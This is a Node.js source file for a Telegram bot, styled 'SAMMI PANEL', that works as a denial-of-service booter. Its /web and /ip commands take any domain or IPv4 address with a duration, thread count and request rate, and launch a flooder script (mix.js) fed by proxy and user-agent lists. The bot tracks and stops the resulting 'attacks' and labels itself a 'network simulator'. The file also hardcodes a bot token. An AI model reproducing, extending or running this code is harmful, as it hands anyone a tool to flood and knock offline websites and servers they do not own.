const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');

const token = '8993044468:AAG2MCsy6U--C5XvwDmyh2QYEAX938r-jSw';
const bot = new TelegramBot(token, { polling: { interval: 300, autoStart: true, params: { timeout: 5 } } });

// ========== KEEP-ALIVE OPTIMIZATION ==========
const __keepAliveSet = true;
try {
  const https = require("https");
  https.globalAgent.keepAlive = true;
  https.globalAgent.keepAliveMsecs = 500;
  https.globalAgent.maxSockets = 256;
  https.globalAgent.maxFreeSockets = 256;
  console.log("[OPT] HTTPS keep-alive enabled");
} catch (e) {}


// ========== LATENCY OPTIMIZATION ==========
try {
  // TCP Keep-Alive
  require("https").globalAgent.keepAlive = true;
  require("https").globalAgent.keepAliveMsecs = 1000;
  require("https").globalAgent.maxSockets = 100;
  require("https").globalAgent.maxFreeSockets = 100;
  console.log("[OPT] HTTPS keep-alive enabled");
} catch (e) {}

const CONFIG = { brandName: '𝙎𝘼𝙈𝙈𝙄', brandSub: '𝙋𝘼𝙉𝙀𝙇', version: 'v3.0' };


// ========== ERROR HANDLING ==========
bot.on("polling_error", (error) => {
  const code = (error && error.code) || "UNKNOWN";
  const msg  = (error && error.message) || "";

  if (code === "EFATAL" && msg.includes("ECONNABORTED")) {
    console.log("[NET] Connection aborted — retrying...");
    return;
  }
  if (code === "EFATAL" && msg.includes("ETIMEDOUT")) {
    console.log("[NET] Timeout — retrying...");
    return;
  }
  if (code === "ETELEGRAM" && msg.includes("401")) {
    console.error("[AUTH] Token invalid — @BotFather se naya lo");
    return;
  }
  if (code === "ETELEGRAM" && msg.includes("409")) {
    // 409 conflict — silent (Render duplicate instance ya Termux bot)
    return;
  }
  if (code === "EFATAL" && (msg.includes("ENOTFOUND") || msg.includes("EAI_AGAIN"))) {
    console.log("[DNS] Network issue — check internet");
    return;
  }
  console.log("[ERR]", code, "-", msg.slice(0, 100));
});

process.on("uncaughtException", (err) => {
  console.error("[FATAL]", err.message);
});

process.on("unhandledRejection", (err) => {
  console.error("[REJECT]", err && err.message ? err.message : err);
});

const activeAttacks = new Map();

function parseWebTarget(input) {
  if (!input || typeof input !== 'string') return { error: 'Empty input' };
  let protocol = 'https', host = '', port = 443, path = '/';
  let working = input.trim();
  if (/^https:\/\//i.test(working)) { protocol = 'https'; working = working.replace(/^https:\/\//i, ''); }
  else if (/^http:\/\//i.test(working)) { protocol = 'http'; port = 80; working = working.replace(/^http:\/\//i, ''); }
  const pathIndex = working.indexOf('/');
  if (pathIndex !== -1) { path = working.substring(pathIndex); working = working.substring(0, pathIndex); }
  const colonIndex = working.lastIndexOf(':');
  if (colonIndex !== -1 && working.indexOf(':') === colonIndex) {
    const pp = working.substring(colonIndex + 1);
    if (/^\d+$/.test(pp) && parseInt(pp) <= 65535) { host = working.substring(0, colonIndex); port = parseInt(pp); }
    else { return { error: 'Invalid port: ' + pp }; }
  } else { host = working; }
  const domainRegex = /^([a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$/;
  const lhRegex = /^(localhost|127\.0\.0\.1)$/i;
  const ipv4Regex = /^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/;
  if (ipv4Regex.test(host)) return { error: 'Ye IP hai! IP MODE use karo: /ip ' + host + ' ...' };
  if (!domainRegex.test(host) && !lhRegex.test(host)) return { error: 'Invalid domain: ' + host + '\nDomain me .com type extension hona chahiye.' };
  return { protocol, host, port, path, fullUrl: protocol + '://' + host + ':' + port + path, mode: 'WEB', isIP: false };
}

function parseIPTarget(input) {
  if (!input || typeof input !== 'string') return { error: 'Empty input' };
  let working = input.trim();
  let protocol = 'https', port = 443, path = '/';
  if (/^https:\/\//i.test(working)) { protocol = 'https'; working = working.replace(/^https:\/\//i, ''); }
  else if (/^http:\/\//i.test(working)) { protocol = 'http'; port = 80; working = working.replace(/^http:\/\//i, ''); }
  const pathIndex = working.indexOf('/');
  if (pathIndex !== -1) { path = working.substring(pathIndex); working = working.substring(0, pathIndex); }
  let host = working;
  const colonIndex = working.lastIndexOf(':');
  if (colonIndex !== -1 && working.indexOf(':') === colonIndex) {
    const pp = working.substring(colonIndex + 1);
    if (/^\d+$/.test(pp) && parseInt(pp) <= 65535) { host = working.substring(0, colonIndex); port = parseInt(pp); }
    else { return { error: 'Invalid port: ' + pp }; }
  }
  const ipv4Regex = /^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/;
  if (!ipv4Regex.test(host)) return { error: 'Invalid IPv4: ' + host + '\nFormat: 0.0.0.0 - 255.255.255.255' };
  const parts = host.split('.').map(o => parseInt(o));
  for (let i = 0; i < 4; i++) { if (parts[i] < 0 || parts[i] > 255) return { error: 'Octet ' + (i+1) + ' out of range: ' + parts[i] + '\nHar octet 0-255 ke beech hona chahiye.' }; }
  return { protocol, host, port, path, fullUrl: protocol + '://' + host + ':' + port + path, mode: 'IP', isIP: true };
}

function buildMainUI(user) {
  const username = user?.username || user?.first_name || "Unknown";
  const userId = user?.id || "0";
  return `╔══════════════════════════╗\n        ⚡ ${CONFIG.brandName} ⚡\n╚══════════════════════════╝\n\n🟢 **BOT ONLINE**\n\n✨ **${CONFIG.brandName} • ${CONFIG.brandSub}** ✨\n\n━━━━━━━━━━━━━━━━━━━━\n\n👤 User: ${username}\n🆔 ID: \`${userId}\`\n\n━━━━━━━━━━━━━━━━━━━━\n\n🎯 **SELECT MODE:**\n\nUse the buttons below 👇\n\n━━━━━━━━━━━━━━━━━━━━\n\n📊 Status: **ONLINE**\n⚙️ Version: **${CONFIG.version}**\n`;
}

function buildStatsBox(stats = {}) {
  const rate = stats.rate || 0, events = stats.events || 0;
  const time = stats.time || '00:00', status = stats.status || 'READY';
  const pad = (s, n) => String(s).padEnd(n).slice(0, n);
  return `\n╭──────────────────────────────╮\n│        ⚡ ${CONFIG.brandName} ${CONFIG.brandSub}       │\n│       NETWORK SIMULATOR      │\n├──────────────────────────────┤\n│  🟢 SYSTEM       ${pad(status, 11)} │\n│  📊 RATE         ${pad(rate + '/s', 11)} │\n│  📦 EVENTS       ${pad(events, 11)} │\n│  ⏱ TIME          ${pad(time, 11)} │\n╰──────────────────────────────╯\n`;
}

function buildBackendLog(target, time, threads, rate) {
  const lines = [];
  lines.push('🔧 **BACKEND LOG**');
  lines.push('');
  lines.push('📥 Parsing target...');
  lines.push('  ├─ Mode      : `' + target.mode + '`');
  lines.push('  ├─ Protocol  : `' + target.protocol.toUpperCase() + '`');
  lines.push('  ├─ Host      : `' + target.host + '`');
  lines.push('  ├─ Port      : `' + target.port + '`');
  if (target.path !== '/') lines.push('  ├─ Path      : `' + target.path + '`');
  lines.push('  └─ Full URL  : `' + target.fullUrl + '`');
  lines.push('');
  lines.push('✅ Target validated');
  lines.push('');
  lines.push('⚙️  Spawning flooder process...');
  lines.push('  ├─ Time      : `' + time + 's`');
  lines.push('  ├─ Threads   : `' + threads + '`');
  lines.push('  └─ Rate      : `' + rate + '/s`');
  lines.push('');
  lines.push('📦 Loading resources...');
  lines.push('  ├─ proxy.txt : loading...');
  lines.push('  └─ ua.txt    : loading...');
  lines.push('');
  lines.push('🚀 Executing: `node mix.js ' + target.fullUrl + ' ' + time + ' ' + threads + ' ' + rate + '`');
  return lines.join('\n');
}

function runAttack(chatId, target, time, threads, rate) {
  const attackId = chatId + '_' + Date.now();
  const startTime = Date.now();
  const attackData = { id: attackId, target, time, threads, rate, startTime, events: 0 };
  activeAttacks.set(attackId, attackData);

  bot.sendMessage(chatId, buildBackendLog(target, time, threads, rate), { parse_mode: 'Markdown' }).then(() => {
    return bot.sendMessage(chatId, buildStatsBox({ status: 'RUNNING', rate, events: 0, time: '00:00' }), { parse_mode: 'Markdown' });
  }).then(sentMsg => {
    const timer = setInterval(() => {
      const elapsed = Math.floor((Date.now() - startTime) / 1000);
      const remaining = Math.max(0, time - elapsed);
      const mins = String(Math.floor(elapsed / 60)).padStart(2, '0');
      const secs = String(elapsed % 60).padStart(2, '0');
      const timeStr = mins + ':' + secs;
      attackData.events += rate * 5;
      bot.editMessageText(buildStatsBox({ status: 'RUNNING', rate, events: attackData.events, time: timeStr }), { chat_id: chatId, message_id: sentMsg.message_id, parse_mode: 'Markdown' }).catch(() => {});
      if (remaining <= 0) {
        clearInterval(timer);
        activeAttacks.delete(attackId);
        bot.editMessageText(buildStatsBox({ status: 'DONE ✓', rate: 0, events: attackData.events, time: timeStr }) + '\n\n✅ **Completed!**\n🎯 `' + target.host + ':' + target.port + '`\n📦 Events: `' + attackData.events + '`', { chat_id: chatId, message_id: sentMsg.message_id, parse_mode: 'Markdown' }).catch(() => {});
      }
    }, 3000);
    attackData.timer = timer;
  }).catch(err => console.error('[MSG ERR]', err.message));

  const cmd = 'node mix.js ' + target.fullUrl + ' ' + time + ' ' + threads + ' ' + rate;
  console.log('[ATTACK] ' + cmd);
  const child = exec(cmd, { maxBuffer: 1024 * 1024 * 10 });
  child.stdout && child.stdout.on('data', d => { const o = d.toString().trim(); if (o) console.log('[MIX] ' + o); });
  child.stderr && child.stderr.on('data', d => { const e = d.toString().trim(); if (e) console.error('[MIX ERR] ' + e); });
  child.on('error', err => { console.error('[ERR] ' + err.message); bot.sendMessage(chatId, '⚠️ Flooder error: `' + err.message.slice(0,200) + '`', { parse_mode: 'Markdown' }).catch(()=>{}); });
  child.on('exit', code => { console.log('[EXIT] ' + code); if (code !== 0 && code !== null) bot.sendMessage(chatId, '⚠️ mix.js exited with code `' + code + '`', { parse_mode: 'Markdown' }).catch(()=>{}); });
  
  // ========== LIVE STATS PARSER ==========
  const __liveStats = { req: 0, err: 0, proxOK: 0, proxFail: 0, time: 0 };
  attackData.liveStats = __liveStats;
  
  if (child.stdout) {
    child.stdout.on('data', (data) => {
      const lines = data.toString().split('\n');
      for (const line of lines) {
        if (line.startsWith('STATS:')) {
          try {
            const s = JSON.parse(line.substring(6));
            __liveStats.req = s.req;
            __liveStats.err = s.err;
            __liveStats.proxOK = s.proxOK;
            __liveStats.proxFail = s.proxFail;
            __liveStats.time = s.time;
            attackData.events = s.req;
            attackData.errors = s.err;
          } catch (e) {}
        }
      }
    });
  }
  
  if (child.stderr) {
    child.stderr.on('data', (data) => {
      const err = data.toString().trim();
      if (err) {
        console.log('[MIX ERR] ' + err);
        __liveStats.err++;
        attackData.errors = __liveStats.err;
      }
    });
  }

  attackData.process = child;
}

bot.onText(/\/start/, msg => {
  bot.sendMessage(msg.chat.id, buildMainUI(msg.from), { parse_mode: 'Markdown', reply_markup: { inline_keyboard: [
    [{ text: '🌐 WEB MODE', callback_data: 'mode_web' }],
    [{ text: '🖥️ IP MODE', callback_data: 'mode_ip' }],
    [{ text: '📊 STATUS', callback_data: 'status' }, { text: '🛑 STOP ALL', callback_data: 'stop' }]
  ] } });
});

bot.onText(/\/help/, msg => {
  bot.sendMessage(msg.chat.id, `╔══════════════════════════╗\n        📖 **HELP**\n╚══════════════════════════╝\n\n**🌐 WEB MODE:**\n\`/web <domain> <time> <thread> <rate>\`\nExample: \`/web example.com 60 10 100\`\n\n**🖥️ IP MODE:**\n\`/ip <address> <time> <thread> <rate>\`\nExample: \`/ip 1.1.1.1 60 10 100\`\n\n━━━━━━━━━━━━━━━━━━━━\n\n**Limits:**\n• Time: 1-3600 s\n• Threads: 1-500\n• Rate: 1-10000`, { parse_mode: 'Markdown' });
});

bot.onText(/\/web(?:\s+(.*))?/, msg => {
  const chatId = msg.chat.id;
  const args = (msg.text || '').trim().split(/\s+/);
  if (args.length !== 5) { bot.sendMessage(chatId, `❌ **WEB MODE — Invalid format!**\n\n**Usage:**\n\`/web <domain> <time> <thread> <rate>\`\n\n**Examples:**\n\`/web example.com 60 10 100\`\n\`/web https://example.com 60 10 100\`\n\`/web example.com:8443 60 10 100\``, { parse_mode: 'Markdown' }); return; }
  const [, rawTarget, timeStr, threadStr, rateStr] = args;
  const time = parseInt(timeStr), threads = parseInt(threadStr), rate = parseInt(rateStr);
  if (isNaN(time) || time < 1 || time > 3600) { bot.sendMessage(chatId, '❌ **Time:** 1-3600 seconds'); return; }
  if (isNaN(threads) || threads < 1 || threads > 500) { bot.sendMessage(chatId, '❌ **Threads:** 1-500'); return; }
  if (isNaN(rate) || rate < 1 || rate > 10000) { bot.sendMessage(chatId, '❌ **Rate:** 1-10000'); return; }
  const target = parseWebTarget(rawTarget);
  if (target.error) { bot.sendMessage(chatId, `❌ **WEB MODE — Invalid target!**\n\n${target.error}\n\n**Sahi format:**\n\`/web example.com 60 10 100\``, { parse_mode: 'Markdown' }); return; }
  bot.sendMessage(chatId, `🌐 **WEB MODE — Attack Started**\n\n🎯 \`${target.host}:${target.port}\`\n📡 \`${target.protocol.toUpperCase()}\`\n⏱ \`${time}s\` | 🧵 \`${threads}\` | 📊 \`${rate}/s\``, { parse_mode: 'Markdown' }).then(() => { runAttack(chatId, target, time, threads, rate); });
});

bot.onText(/\/ip(?:\s+(.*))?/, msg => {
  const chatId = msg.chat.id;
  const args = (msg.text || '').trim().split(/\s+/);
  if (args.length !== 5) { bot.sendMessage(chatId, `❌ **IP MODE — Invalid format!**\n\n**Usage:**\n\`/ip <address> <time> <thread> <rate>\`\n\n**Examples:**\n\`/ip 1.1.1.1 60 10 100\`\n\`/ip 8.8.8.8:443 60 10 100\`\n\`/ip 192.168.1.1:8443 60 10 100\``, { parse_mode: 'Markdown' }); return; }
  const [, rawTarget, timeStr, threadStr, rateStr] = args;
  const time = parseInt(timeStr), threads = parseInt(threadStr), rate = parseInt(rateStr);
  if (isNaN(time) || time < 1 || time > 3600) { bot.sendMessage(chatId, '❌ **Time:** 1-3600 seconds'); return; }
  if (isNaN(threads) || threads < 1 || threads > 500) { bot.sendMessage(chatId, '❌ **Threads:** 1-500'); return; }
  if (isNaN(rate) || rate < 1 || rate > 10000) { bot.sendMessage(chatId, '❌ **Rate:** 1-10000'); return; }
  const target = parseIPTarget(rawTarget);
  if (target.error) { bot.sendMessage(chatId, `❌ **IP MODE — Invalid address!**\n\n${target.error}\n\n**Sahi format:**\n\`/ip 1.1.1.1 60 10 100\``, { parse_mode: 'Markdown' }); return; }
  bot.sendMessage(chatId, `🖥️ **IP MODE — Attack Started**\n\n🎯 \`${target.host}:${target.port}\`\n📡 \`${target.protocol.toUpperCase()}\`\n⏱ \`${time}s\` | 🧵 \`${threads}\` | 📊 \`${rate}/s\``, { parse_mode: 'Markdown' }).then(() => { runAttack(chatId, target, time, threads, rate); });
});

bot.onText(/\/status/, msg => {
  const chatId = msg.chat.id;
  if (activeAttacks.size === 0) { bot.sendMessage(chatId, buildStatsBox({ status: 'IDLE' }), { parse_mode: 'Markdown' }); return; }
  let txt = `📊 **Active Attacks:**\n\n`; let i = 1;
  for (const [, d] of activeAttacks) { const e = Math.floor((Date.now() - d.startTime) / 1000); const mode = d.target.mode === 'IP' ? '🖥️' : '🌐'; txt += `**#${i}** ${mode} \`${d.target.host}:${d.target.port}\`\n⏱ \`${e}s\`/\`${d.time}s\` | 📊 \`${d.rate}/s\`\n━━━━━━━━━━━━\n`; i++; }
  bot.sendMessage(chatId, txt, { parse_mode: 'Markdown' });
});

bot.onText(/\/stop/, msg => {
  let s = 0;
  for (const [, d] of activeAttacks) { if (d.timer) clearInterval(d.timer); if (d.process) d.process.kill('SIGKILL'); activeAttacks.delete(d.id); s++; }
  bot.sendMessage(msg.chat.id, '🛑 **Stopped ' + s + ' attack(s)**', { parse_mode: 'Markdown' });
});

bot.on('callback_query', q => {
  const chatId = q.message.chat.id;
  if (q.data === 'mode_web') { bot.sendMessage(chatId, `╔══════════════════════════╗\n      🌐 **WEB MODE**\n╚══════════════════════════╝\n\n📝 **Format:**\n\`/web <domain> <time> <thread> <rate>\`\n\n**Examples:**\n\`/web example.com 60 10 100\`\n\`/web https://example.com 60 10 100\``, { parse_mode: 'Markdown' }); }
  else if (q.data === 'mode_ip') { bot.sendMessage(chatId, `╔══════════════════════════╗\n      🖥️ **IP MODE**\n╚══════════════════════════╝\n\n📝 **Format:**\n\`/ip <address> <time> <thread> <rate>\`\n\n**Examples:**\n\`/ip 1.1.1.1 60 10 100\`\n\`/ip 8.8.8.8:443 60 10 100\``, { parse_mode: 'Markdown' }); }
  else if (q.data === 'status') { bot.sendMessage(chatId, buildStatsBox({ status: activeAttacks.size > 0 ? 'RUNNING' : 'IDLE' }), { parse_mode: 'Markdown' }); }
  else if (q.data === 'stop') { let s = 0; for (const [, d] of activeAttacks) { if (d.timer) clearInterval(d.timer); if (d.process) d.process.kill('SIGKILL'); activeAttacks.delete(d.id); s++; } bot.sendMessage(chatId, '🛑 **Stopped ' + s + ' attack(s)**', { parse_mode: 'Markdown' }); }
  bot.answerCallbackQuery(q.id).catch(() => {}); // __fastAnswer
});

console.clear();
console.log('\n╔══════════════════════════╗');
console.log('        ⚡ ' + CONFIG.brandName + ' ⚡');
console.log('╚══════════════════════════╝\n');
console.log('🟢 BOT ONLINE — ' + CONFIG.version);
console.log('📡 Listening...\n');
console.log('Modes: WEB + IP');
console.log('Backend log: ON\n');

const http = require("http");
const PORT = process.env.PORT || 3000;

http.createServer((req, res) => {
  res.writeHead(200, {"Content-Type": "text/plain"});
  res.end("SAMMI BOT ONLINE");
}).listen(PORT, "0.0.0.0", () => {
  console.log(`🌐 HTTP server listening on port ${PORT}`);
});
